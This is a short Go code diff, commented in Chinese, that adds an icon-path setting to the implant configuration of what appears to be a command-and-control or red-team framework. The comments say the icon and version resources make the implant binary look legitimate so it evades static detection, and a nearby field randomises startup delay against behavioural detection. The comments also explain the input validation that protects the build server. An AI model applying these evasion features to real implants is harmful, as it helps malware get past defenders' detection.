@@ -286,6 +286,17 @@ type ImplantConfig struct {
 	// 启动随机延迟（秒）：植入端启动后随机休眠 [min,max] 秒，打乱"启动即行为"检测节奏。
 	StartupDelayMin int `mapstructure:"startup_delay_min" json:"startup_delay_min"`
 	StartupDelayMax int `mapstructure:"startup_delay_max" json:"startup_delay_max"`
+	// IconPath PE 版本资源用的图标（**服务端本地 .ico 路径**，v1.4.0 S3 第二批）。
+	//
+	// 为什么是"服务端本地路径"而不是前端上传：图标属于"静态降特征/合法外观"（正常商业程序
+	// 都带图标与版本信息，没有 .rsrc 的 PE 本身就是个可疑信号，见 docs/EVASION.md §2.3）。
+	// 但把"客户端上传的字节"接到"服务端读文件写进载荷"这条链上会同时引入两个新攻击面：
+	// ① 内容/路径可控 = 任意文件读取原语；② 上传的"图标"可以是伪装成 ICO 的 PE/脚本，
+	// 被写进 .rsrc 后等于给载荷加了一段攻击者可控的字节（把构建服务端变成投放通道）。
+	// 因此只接受操作员在自己机器上放好的本地路径，并做"后缀 .ico / 存在 / ≤1 MiB / 结构合法"
+	// 四道校验（见 internal/server/builder/patch_resources.go 的 loadIconImages）。
+	// 空 = 不打图标（默认；构建请求里的 resource_icon_path 可单次覆盖）。
+	IconPath string `mapstructure:"icon_path" json:"icon_path"`
 }
 
 type DatabaseConfig struct {
